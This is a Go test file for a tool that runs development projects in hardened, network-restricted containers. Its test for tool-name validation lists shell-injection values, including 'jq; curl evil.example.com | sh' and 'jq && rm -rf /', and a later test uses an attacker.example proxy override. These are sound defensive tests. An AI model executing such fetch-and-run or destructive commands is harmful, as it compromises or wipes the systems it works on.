package project

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/mwing/isolated-dev/internal/config"
	"github.com/mwing/isolated-dev/internal/langs"
)

func loadSet(t *testing.T, body string) *langs.Set {
	t.Helper()
	dir := t.TempDir()
	if err := os.MkdirAll(filepath.Join(dir, "golang"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, "golang", "language.yaml"), []byte(body), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, "golang", "Dockerfile.template"),
		[]byte("FROM golang:{{VERSION}}\nWORKDIR /workspace\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	set, err := langs.Load(dir)
	if err != nil {
		t.Fatal(err)
	}
	return set
}

const goPlugin = `name: golang
versions: ["1.24", "1.26"]
ports: [8080]
registries: [proxy.golang.org, sum.golang.org]
detection:
  files: [go.mod]
  version_files:
    - file: go.mod
      extract: 'go ([0-9]+\.[0-9]+)'
`

func projectDir(t *testing.T, files map[string]string) string {
	t.Helper()
	dir := t.TempDir()
	for name, body := range files {
		if err := os.WriteFile(filepath.Join(dir, name), []byte(body), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	return dir
}

func TestSanitizeName(t *testing.T) {
	// Directories with spaces and capitals broke v1's builds.
	// A docker name must begin and end alphanumeric, so trailing
	// separators are not merely ugly: the daemon rejects them.
	cases := map[string]string{
		"My Project":            "my-project",
		"api":                   "api",
		"--weird--":             "weird",
		"my  project":           "my-project",
		"trailing!":             "trailing",
		"":                      "project",
		"!!!":                   "project",
		"Ünïcødé":               "n-c-d",
		strings.Repeat("x", 60): strings.Repeat("x", 40),
	}
	for in, want := range cases {
		if got := SanitizeName(in); got != want {
			t.Errorf("SanitizeName(%q) = %q, want %q", in, got, want)
		}
	}
}

func TestResolveUsesProjectDockerfileWhenPresent(t *testing.T) {
	dir := projectDir(t, map[string]string{
		"go.mod":     "module x\n\ngo 1.26\n",
		"Dockerfile": "FROM scratch\n",
	})
	p, err := Resolve(dir, config.Defaults(), loadSet(t, goPlugin))
	if err != nil {
		t.Fatal(err)
	}
	if p.FromTemplate {
		t.Error("project Dockerfile should win over the language template")
	}
	body, err := p.RenderedDockerfile()
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(body, "FROM scratch") {
		t.Errorf("rendered = %q", body)
	}
}

func TestResolveRendersLanguageTemplateWhenNoDockerfile(t *testing.T) {
	dir := projectDir(t, map[string]string{"go.mod": "module x\n\ngo 1.26\n"})
	p, err := Resolve(dir, config.Defaults(), loadSet(t, goPlugin))
	if err != nil {
		t.Fatal(err)
	}
	if !p.FromTemplate {
		t.Fatal("expected the language template")
	}
	body, err := p.RenderedDockerfile()
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(body, "FROM golang:1.26") {
		t.Errorf("version not substituted: %q", body)
	}
	if strings.Contains(body, "{{") {
		t.Errorf("placeholder left unrendered: %q", body)
	}
}

func TestNoDockerfileAndNoLanguageIsAnError(t *testing.T) {
	dir := projectDir(t, map[string]string{"README.md": "hi"})
	p, err := Resolve(dir, config.Defaults(), loadSet(t, goPlugin))
	if err != nil {
		t.Fatal(err)
	}
	if _, err := p.RenderedDockerfile(); err == nil {
		t.Fatal("expected an error rather than an empty build")
	}
}

func TestNetworkDefaultsToAllowlist(t *testing.T) {
	// Deny by default is the tool's promise; a run that silently had the
	// whole internet would not keep it.
	dir := projectDir(t, map[string]string{"go.mod": "module x\n"})
	p, err := Resolve(dir, config.Defaults(), loadSet(t, goPlugin))
	if err != nil {
		t.Fatal(err)
	}
	if p.Network != NetworkAllowlist {
		t.Fatalf("network = %q, want allowlist", p.Network)
	}
}

func TestNetworkModeParsing(t *testing.T) {
	for _, in := range []string{"", "allowlist", "open", "none"} {
		if _, err := ParseNetworkMode(in); err != nil {
			t.Errorf("ParseNetworkMode(%q): %v", in, err)
		}
	}
	if _, err := ParseNetworkMode("bridge"); err == nil {
		// v1 accepted bridge/host and did nothing with them; silently
		// accepting it again would imply behavior that does not exist.
		t.Error("v1's bridge mode should be rejected, not silently accepted")
	}
}

func TestRunSpecIsHardenedAndMountsOnlyTheWorkspace(t *testing.T) {
	dir := projectDir(t, map[string]string{"go.mod": "module x\n"})
	p, err := Resolve(dir, config.Defaults(), loadSet(t, goPlugin))
	if err != nil {
		t.Fatal(err)
	}
	spec := p.RunSpec(config.Defaults(), Grants{}, []string{"echo", "hi"}, false)

	args := strings.Join(spec.Args(), " ")
	for _, want := range []string{"--user 1000:1000", "--cap-drop ALL", "--security-opt no-new-privileges:true"} {
		if !strings.Contains(args, want) {
			t.Errorf("missing %q in %s", want, args)
		}
	}
	if len(spec.Mounts) != 1 || spec.Mounts[0].Source != dir {
		t.Errorf("mounts = %+v, want only the workspace", spec.Mounts)
	}
	if err := spec.Validate(); err != nil {
		t.Fatalf("Validate: %v", err)
	}
}

func TestPortsComeFromThePluginAndPublishToLoopback(t *testing.T) {
	dir := projectDir(t, map[string]string{"go.mod": "module x\n"})
	p, err := Resolve(dir, config.Defaults(), loadSet(t, goPlugin))
	if err != nil {
		t.Fatal(err)
	}
	spec := p.RunSpec(config.Defaults(), Grants{}, nil, false)
	if len(spec.Ports) != 1 || spec.Ports[0].Container != 8080 {
		t.Fatalf("ports = %+v", spec.Ports)
	}
	if !strings.Contains(strings.Join(spec.Args(), " "), "127.0.0.1:8080:8080") {
		t.Errorf("ports should publish to loopback: %v", spec.Args())
	}
}

func TestRegistriesComeFromThePlugin(t *testing.T) {
	// Allowlist mode needs per-language data, or it is one global list
	// that is either too wide for everyone or too narrow for someone.
	dir := projectDir(t, map[string]string{"go.mod": "module x\n"})
	p, err := Resolve(dir, config.Defaults(), loadSet(t, goPlugin))
	if err != nil {
		t.Fatal(err)
	}
	got := p.Registries()
	if len(got) != 2 || got[0] != "proxy.golang.org" {
		t.Fatalf("registries = %v", got)
	}
}

func TestImageNameSurvivesAwkwardDirectoryNames(t *testing.T) {
	base := t.TempDir()
	dir := filepath.Join(base, "My Weird Project")
	if err := os.MkdirAll(dir, 0o755); err != nil {
		t.Fatal(err)
	}
	p, err := Resolve(dir, config.Defaults(), loadSet(t, goPlugin))
	if err != nil {
		t.Fatal(err)
	}
	if strings.ContainsAny(p.Image, " ") {
		t.Fatalf("image name has a space: %q", p.Image)
	}
	if !strings.HasPrefix(p.Image, "dev-img-") {
		t.Errorf("image = %q", p.Image)
	}
}

func TestToolsImageTracksContents(t *testing.T) {
	dir := projectDir(t, map[string]string{"go.mod": "module x\n"})
	p, err := Resolve(dir, config.Defaults(), loadSet(t, goPlugin))
	if err != nil {
		t.Fatal(err)
	}

	// No tools means no derived image at all.
	if p.ToolsImage(nil) != p.Image {
		t.Errorf("empty list produced a derived tag: %q", p.ToolsImage(nil))
	}

	one := p.ToolsImage([]string{"jq"})
	two := p.ToolsImage([]string{"jq", "ripgrep"})
	if one == two {
		t.Fatal("different tool sets share a tag; the tag would lie about its contents")
	}
	// Order is not content: the same set must reuse the built image.
	if got := p.ToolsImage([]string{"ripgrep", "jq"}); got != two {
		t.Errorf("tag depends on order: %q vs %q", got, two)
	}
}

func TestToolsDockerfileLayersOnTheProjectImage(t *testing.T) {
	df := ToolsDockerfile("dev-img-app", []string{"jq"})
	if !strings.HasPrefix(df, "FROM dev-img-app\n") {
		t.Errorf("tools must layer onto the project image:\n%s", df)
	}
	// A declaration rebuilt into an image, never a committed container.
	if strings.Contains(df, "commit") {
		t.Errorf("unexpected commit:\n%s", df)
	}
	for _, mgr := range []string{"apt-get", "apk", "dnf"} {
		if !strings.Contains(df, mgr) {
			t.Errorf("no %s branch; the image family is not known in advance:\n%s", mgr, df)
		}
	}
}

func TestToolNamesAreValidatedAgainstInjection(t *testing.T) {
	// The list is interpolated into a RUN line, so a name carrying shell
	// metacharacters would execute during the build.
	for _, bad := range []string{
		"jq; curl evil.example.com | sh",
		"jq && rm -rf /",
		"$(whoami)",
		"`id`",
		"jq|tee",
		"",
		"a b",
	} {
		if ValidToolName(bad) {
			t.Errorf("accepted dangerous tool name %q", bad)
		}
	}
	for _, ok := range []string{"jq", "ripgrep", "python3.12", "lib-foo_bar", "g++"} {
		if !ValidToolName(ok) {
			t.Errorf("rejected a legitimate name %q", ok)
		}
	}
}

func TestDangerousToolNameNeverReachesTheDockerfile(t *testing.T) {
	df := ToolsDockerfile("base", []string{"jq; curl evil.example.com | sh"})
	if strings.Contains(df, "evil.example.com") {
		t.Fatalf("injection reached the build:\n%s", df)
	}
}

func TestBaseImagesFindsWhatWillRun(t *testing.T) {
	df := `FROM golang:1.26-alpine AS build
RUN go build ./...

FROM node:22-bookworm-slim AS runtime
COPY --from=build /out /out

FROM build
FROM scratch
FROM debian@sha256:abc123
`
	got := BaseImages(df)
	want := []string{"golang:1.26-alpine", "node:22-bookworm-slim"}
	if len(got) != len(want) {
		t.Fatalf("BaseImages = %v, want %v", got, want)
	}
	for i := range want {
		if got[i] != want[i] {
			t.Fatalf("BaseImages = %v, want %v", got, want)
		}
	}
}

func TestBaseImagesSkipsWhatCannotBePinned(t *testing.T) {
	// A stage name is not an image; scratch is not fetched; an existing
	// digest is already pinned.
	for _, df := range []string{
		"FROM build\n",
		"FROM scratch\n",
		"FROM debian@sha256:deadbeef\n",
	} {
		if got := BaseImages("FROM alpine AS build\n" + df); len(got) != 1 {
			t.Errorf("BaseImages(%q) = %v, want only alpine", df, got)
		}
	}
}

func TestApplyPinsRewritesAndExplains(t *testing.T) {
	df := "FROM golang:1.26-alpine AS build\nRUN go build ./...\n"
	pins := map[string]string{"golang:1.26-alpine": "golang@sha256:abc"}

	got := ApplyPins(df, pins)
	if !strings.Contains(got, "FROM golang@sha256:abc AS build") {
		t.Fatalf("digest not applied:\n%s", got)
	}
	// A bare digest tells a reader nothing about what it was meant to be.
	if !strings.Contains(got, "# pinned from golang:1.26-alpine") {
		t.Errorf("no note of the original tag:\n%s", got)
	}
	if strings.Contains(got, "FROM golang:1.26-alpine AS build") {
		t.Errorf("original FROM survived:\n%s", got)
	}
}

func TestApplyPinsLeavesUnpinnedAlone(t *testing.T) {
	df := "FROM alpine:3\nFROM golang:1.26\n"
	got := ApplyPins(df, map[string]string{"golang:1.26": "golang@sha256:x"})
	if !strings.Contains(got, "FROM alpine:3") {
		t.Errorf("unpinned image was altered:\n%s", got)
	}
	if ApplyPins(df, nil) != df {
		t.Error("empty pin set changed the Dockerfile")
	}
}

func TestUpgradeGoesInTheFinalStage(t *testing.T) {
	// The final stage is the one that runs. Upgrading an earlier build
	// stage would spend the time and ship none of it.
	df := "FROM golang:1.26 AS build\nRUN go build ./...\n\nFROM alpine:3\nCOPY --from=build /out /out\n"
	got := WithPackageUpgrade(df)

	upgradeAt := strings.Index(got, UpgradeStep)
	finalFrom := strings.Index(got, "FROM alpine:3")
	buildFrom := strings.Index(got, "FROM golang:1.26")
	if upgradeAt < 0 {
		t.Fatalf("no upgrade step:\n%s", got)
	}
	if upgradeAt < finalFrom {
		t.Errorf("upgrade landed before the final stage:\n%s", got)
	}
	if upgradeAt < buildFrom {
		t.Errorf("upgrade landed in the build stage:\n%s", got)
	}
	// It has to run as root, whatever the base image left behind.
	if !strings.Contains(got[finalFrom:], "USER root") {
		t.Errorf("upgrade would run unprivileged:\n%s", got)
	}
}

func TestUpgradeCoversEachPackageManager(t *testing.T) {
	// The image family comes from the project, not from us.
	for _, mgr := range []string{"apt-get", "apk", "dnf"} {
		if !strings.Contains(UpgradeStep, mgr) {
			t.Errorf("no %s branch in the upgrade step", mgr)
		}
	}
	// An image with no package manager must not fail the build.
	if !strings.Contains(UpgradeStep, "|| true") {
		t.Error("an image without a package manager would fail to build")
	}
}

func TestUpgradeLeavesADockerfileWithoutFromAlone(t *testing.T) {
	if got := WithPackageUpgrade("RUN echo hi\n"); strings.Contains(got, UpgradeStep) {
		t.Error("inserted an upgrade into a Dockerfile with no stage to put it in")
	}
}

func TestRunSpecAppliesOnlyTheGrantsItIsGiven(t *testing.T) {
	// The four host-access config keys were parsed, prompted for, and never
	// consumed. This is the test that would have caught that: the spec is
	// asked what it does with a grant, and what it does without one.
	dir := projectDir(t, map[string]string{"go.mod": "module x\n"})
	p, err := Resolve(dir, config.Defaults(), loadSet(t, goPlugin))
	if err != nil {
		t.Fatal(err)
	}

	bare := p.RunSpec(config.Defaults(), Grants{}, nil, false)
	if len(bare.Mounts) != 1 {
		t.Fatalf("an ungranted run mounted more than the workspace: %+v", bare.Mounts)
	}
	if len(bare.GroupAdd) != 0 || len(bare.Env) != 0 {
		t.Errorf("an ungranted run gained groups or environment: %+v %v",
			bare.GroupAdd, bare.Env)
	}

	granted := p.RunSpec(config.Defaults(), Grants{
		GitConfig:       "/host/tmp/gitconfig",
		DockerSocket:    DockerSocketPath,
		DockerSocketGID: "999",
		Env:             []string{"AWS_PROFILE=dev"},
	}, nil, false)

	args := strings.Join(granted.Args(), " ")
	for _, want := range []string{
		"type=bind,source=/host/tmp/gitconfig,target=" + SystemGitConfig + ",readonly",
		"type=bind,source=" + DockerSocketPath + ",target=" + DockerSocketPath,
		"--group-add 999",
		"--env AWS_PROFILE=dev",
	} {
		if !strings.Contains(args, want) {
			t.Errorf("missing %q in %s", want, args)
		}
	}
	// The gitconfig is read-only and the socket is not: one is a value being
	// read, the other is a protocol being spoken.
	for _, m := range granted.Mounts {
		if m.Target == DockerSocketPath && m.ReadOnly {
			t.Error("a read-only docker socket cannot be used")
		}
		if m.Target == SystemGitConfig && !m.ReadOnly {
			t.Error("the granted gitconfig must not be writable from inside")
		}
	}
	if err := granted.Validate(); err != nil {
		t.Fatalf("Validate: %v", err)
	}
}

func TestGrantedEnvComesBeforeAnythingTheCallerAppends(t *testing.T) {
	// docker takes the last --env for a name. The egress topology's proxy
	// settings are appended after RunSpec returns, so a granted variable
	// must not be able to land after them and turn filtering off.
	dir := projectDir(t, map[string]string{"go.mod": "module x\n"})
	p, err := Resolve(dir, config.Defaults(), loadSet(t, goPlugin))
	if err != nil {
		t.Fatal(err)
	}
	spec := p.RunSpec(config.Defaults(), Grants{
		Env: []string{"HTTP_PROXY=http://attacker.example"},
	}, nil, false)
	spec.Env = append(spec.Env, "HTTP_PROXY=http://sidecar:3128")

	var last string
	for _, kv := range spec.Env {
		if strings.HasPrefix(kv, "HTTP_PROXY=") {
			last = kv
		}
	}
	if last != "HTTP_PROXY=http://sidecar:3128" {
		t.Fatalf("effective HTTP_PROXY = %q", last)
	}
}
